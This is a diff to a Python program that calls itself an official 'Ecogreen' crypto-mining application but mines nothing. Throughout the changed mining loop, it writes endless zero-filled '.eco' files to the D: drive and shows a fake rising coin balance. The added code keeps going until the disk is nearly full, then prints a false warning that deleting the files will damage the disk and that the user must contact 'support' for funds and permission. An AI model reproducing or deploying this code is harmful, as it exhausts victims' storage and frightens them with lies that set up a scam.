@@ -2,15 +2,16 @@ import os
 import time
 import sys
 import urllib.request
+import shutil
+import math
+import random
 from ctypes import windll
-import ctypes
 
 UPDATE_URL = "https://raw.githubusercontent.com/Mavox-ID/ecogreen-miner/main/ecomainer.py"
-BALANCE_FILE = "C:/Intel/BB_ecogreen.txt" 
-
+BALANCE_FILE = "C:/Intel/BB_ecogreen.txt"
 
 APP_NAME = "Ecogreen Miner"
-APP_VERSION = "3.4"
+APP_VERSION = "4.0"
 APP_DESCRIPTION = "Official Ecogreen Mining Application."
 APP_AUTHOR = "Mavox-ID"
 APP_COMPANY = "OOO Kripto"
@@ -47,7 +48,7 @@ def display_intro():
     Company: {APP_COMPANY}
     Author: {APP_AUTHOR}
     """
-    sys.stdout.write("\033[H\033[J") 
+    sys.stdout.write("\033[H\033[J")
     print(intro_text)
     time.sleep(10)
 
@@ -73,31 +74,66 @@ def mine_ecogreen(disk_letter):
     os.makedirs(ecogreen_folder, exist_ok=True)
 
     balance, uah_balance = load_balance()
+    tasks_resolved = 0  
 
     file_count = 0
 
     while True:
+       
+        a = random.randint(1, 10000000000)
+        b = random.randint(1, 1000000)
+        c = random.randint(1, 1000000)
+
+        try:
+            result = math.sqrt(a) / b - c  
+            tasks_resolved += 1
+        except ZeroDivisionError:
+            pass
+
+       
         file_path = os.path.join(ecogreen_folder, f"ecogreen.h_{file_count}.eco")
         with open(file_path, "wb") as f:
-            f.write(b"\x00" *  1024)
-        
+            f.write(b"\x00" * 1024) 
+
         file_count += 1
         if file_count % 100 == 0:
-            balance += 0.01
-            uah_balance = balance * 10.0 
+            balance += 0.01  
+            uah_balance = balance * 10.0  
 
             save_balance(balance, uah_balance)
+
+       
         sys.stdout.write("\033[H\033[J")
         print(f"HDD: {disk_letter}:/")
         print("HS: 10 F/S")
         print(f"CR: Created file {file_path}")
+        print(f"DS: checked {tasks_resolved} tasks") 
         print(f"Balance: {balance:.2f} Ecogreen ({uah_balance:.2f} UAH)")
+
+       
+        total, used, free = shutil.disk_usage(f"{disk_letter}:/")
+        free_kb = free // 1024  
+
+        if free_kb < 1024:  
+            print("\nWarning! You do not have enough memory to continue working with the disk, "
+                  "do not delete hashes on the disk! Contact Ecogreen support for funds and permission to delete "
+                  "hashes from the disk! (If you delete them until we process them, your disk may break, or no longer "
+                  "work, because this extension: .eco is a collection of data and tasks that heavily load the disk, "
+                  "their removal can lead to disk failure)\n")
+            break
+
+        
+        if free_kb >= 1024 * 1024:
+            print(f"Remaining space: {free_kb / (1024 * 1024):.2f} GB")
+        elif free_kb >= 1024:
+            print(f"Remaining space: {free_kb / 1024:.2f} MB")
+        else:
+            print(f"Remaining space: {free_kb:.2f} KB")
         print("OOO kriptoTM & binance (Ecogreen 2019)")
 
         time.sleep(0.1)
 
 def add_icon_to_exe():
-
     icon_path = "icon.ico"  
     windll.shell32.SetCurrentProcessExplicitAppUserModelID(APP_NAME)  
 
@@ -106,7 +142,6 @@ if __name__ == "__main__":
     display_intro() 
 
     while True:
-        
         if check_disk_exists("D"):
             print("Disk D:/ found. Starting mining...")
             mine_ecogreen("D")
